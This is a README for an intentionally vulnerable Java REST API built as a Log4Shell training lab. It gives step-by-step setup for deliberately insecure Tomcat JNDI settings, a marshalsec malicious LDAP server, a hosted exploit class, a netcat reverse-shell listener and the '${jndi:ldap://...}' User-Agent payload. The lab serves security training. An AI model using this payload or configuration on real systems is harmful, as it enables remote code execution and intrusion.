# vuln4japi
A vulnerable Java based REST API for demonstrating CVE-2021-44228 (log4shell).

# Motivation
Log4Shell took the internet by storm in early December 2021. A Zero Day vulnerability in the Apache Log4j logging library, capable of Remote Code Execution (RCE) that had organizations across the globe scrambling to fix/patch/mitigate their public facing Java applications. As the InfoSec community came together to provide a continued analysis and solutions to security teams, the Log4j community was busy developing patches to ensure an end to this vuln. 

I developed this simple vulnerable REST API that demonstrates the path to Remote Code Execution (RCE) by exploiting this vulnerability using the Apache Tomcat application server. I hope this proof of concept can be used to train your SecOps teams or educating current and future application developers. Train your teams and improve your defenses, including but not limited to, SIEM rules/alerts, EDRs, SOARs.

To understand the work flow of this attack, take a look at this graphic provided by the Swiss Government Computer Emergency Response Team GovCERT.ch: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/assets/log4j_attack.png

# Disclaimer
>This tutorial and source code are provided solely for educational and training purposes. Please use ethically and responsibly.
>This tutorial was prepared with the assumption that the attacker and vulnerable application are on the same computer. For a more real world experience spread out the architecture and run the vulnerable application on its own server and use something like Kali Linux or another flavor to simulate the attacker.

Let's get started.

# What You Need
- Test Environment (VM or Hardware, preferably Linux to build and test. I used a VM running Ubuntu Server)
- Java JDK (I used OpenJDK 1.8.0_312)
- Maven (Java project build and management tool; I used ver. 3.6.3)
- Marshalsec (Java Unmarshaller for JNDI Redirecting: https://github.com/mbechler/marshalsec)
- Apache Tomcat 8 (I used version 8.0.32: https://archive.apache.org/dist/tomcat/tomcat-8/v8.0.32/bin/)
- Python3 Installed (we can use the http.server module to run a simple local web server to host our .class file)
- A malicious Java class file (source code provided in the xploitz directory)
- Finally, clone this repo!

# Process Flow - Vulnerable Web Application
Once you have Java JDK and Maven installed, assuming you're on a Linux distro, change directory to your vuln4japi location and build your project.
> Note: You may want to modify certain components of the app before you build it. For example, you can modify the path to the log4j logs in the log4j2.xml file. Or you may want to change the name of the resulting war file in the pom.xml file. Its totally up to you.

```bash
cd /path/to/vuln4japi
mvn clean package -DskipTests
```
If you dont see any build errors, you should have a newly created target directory with your vuln4japi.war file. Ok, we'll come back to this file a little later. Let's look at Tomcat briefly.

Depending on your version of Java 8, later versions of 8 may have this particular setting (com.sun.jndi.ldap.object.trustURLCodebase) set to false. This effectively disallows JNDI from loading a remote codebase via LDAP. Which is what this vulnerability is exploiting. So, we need to modify Tomcat's catalina.properties file to set this system setting to True, making Tomcat intentionally vulnerable.

Once you download apache-tomcat-8.0.32.tar.gz for Linux, untar it somewhere like the /opt directory.

```bash
tar -xvf apache-tomcat-8.0.32.tar.gz -C /opt
```
Change directory to /conf and modify catalina.properties at the bottom of the file. 
>Note: Use your prefered text editor. I use vim in this example.

```bash
cd /opt/apache-tomcat-8.0.32/conf

vim catalina.properties

# add the following system properties at the very end
com.sun.jndi.ldap.object.trustURLCodebase=true
com.sun.jndi.rmi.object.trustURLCodebase=true
com.sun.jndi.cosnaming.object.trustURLCodebase=true
``` 
Exit your text editor and start Tomcat using the catalina.sh script inside the /bin directory.

```bash
cd /opt/apache-tomcat-8.0.32/bin
./catalina.sh start
```
Test your instance of Apache Tomcat by navigating to http://localhost:8080/ or a simple cURL command from the command line interface.

```bash
curl -vv http://localhost:8080/
```

If you see a welcome page on your browser or terminal, then it should be working. Now we can deploy our Vulnerable App.

Copy your .war file to Tomcat's /webapps directory. Tomcat will hotdeploy your application in a matter of seconds.

```bash
cp /vuln4jpi/target/vuln4japi.war /opt/apache-tomcat-8.0.32/webapps
```

Test your vulnerable app by navigating to the app URL or again using cURL from the command line.
On the browser: http://localhost:8080/vuln4japi/api

```bash
curl -vv http://localhost:8080/vuln4japi/api
```
You should see the following message displayed, ```Hi, this is a Vulnerable App!!```

Now that we have some components working, let's exploit this thing...

# Process Flow - Attacker Tools
## Marshalsec
The marshalsec project is an excellent resource for understanding this type of attack in detail. Essentially, it acts as a malicous LDAP server that then redirects any request to a malicous web server hosting the .class file. I highly recommend reviewing some of the documentation posted on mbechler's Github repo prior to using marshalsec: https://github.com/mbechler/marshalsec

If you decide to skip the technical details and documentation, clone that repo and change directory to it. Now, before you build that java project, I recommend adding a one line debug statement in the LDAPRefServer.java file. This print statement will be useful when capture the LDAP query from the vulnerable server.

Using your favorite text editor, edit the following file and add the line as shown in the code block below, in the ```processSearchResult()``` method.

```bash
vim marshalsec/src/main/java/marshalsec/jndi/LDAPRefServer.java
```
```java
@Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
                // add this line to show the full request information
                System.out.println("Request: " + result.getRequest());
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }
```
Once you've modified the file save and exit your text editor. Now you should be able to build the marshalsec project using Maven.
Change directory back to the root of the marshalsec folder and execute maven.

```bash
mvn clean package -DskipTests
```

If there are no build errors, you should see the newly created /marshalsec/target directory with the ```marshalsec-0.0.3-SNAPSHOT-all.jar`` file included.

Let's set up the rest of our attacker tools before we execute our marshalsec malicious LDAP server.

## Malicious .class file
Change directory to the exploitz folder and compile the ```Exploit.java``` file included.

```bash
javac Exploit.java
```
If you do not get any errors, you should have an ```Exploit.class``` file.

Ok. That should do it. You should have everything you need compiled and Web Server running. Again, assuming you're running this test on a Linux server, you will open at least 5 Terminal windows.

Terminal 1: Run marshalsec 
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://localhost:8081/#Exploit" 1389
```
Terminal 2: Change directory to the xploitz directory where your ```Exploit.class``` is and run a local Python server.
```bash
python3 -m http.server 8081
```
Terminal 3: Tail your ```/tmp/logs/vuln4jpi_log4j.log``` file to follow the requests made to your vulnerable app.
```bash
tail -f /tmp/logs/vuln4japi_log4j.log
```
Terminal 4: Open a netcat listener on port 8001. This will be the reverse shell connection from the same host of course. Remember, we are doing all of this on the same host. For a real world experience, try using 2 or 3 different computers.
```bash
nc -lv 8001
```
Terminal 5: Submit your payload using a simple cURL command.
```bash
curl -vv http://localhost:8080/vuln4japi/api -H 'User-Agent: ${jndi:ldap://localhost:1389/a}'
```
If all works as expected, you should have a shell forwarded to your netcat listener on port 8001. Review all your Terminal windows and observe the behavior in each one of them looking for any typos or syntax errors. There's alot going on here so human error is alway in play. Give it a few runs until you get it down. You may have to modify the source a little, but hey, that's what its for.

I hope you enjoy learning from this project as much as I enjoyed putting it together. Find me on twitter @offswitchsec if you have any feedback or comments. Enjoy and Happy Hacking!

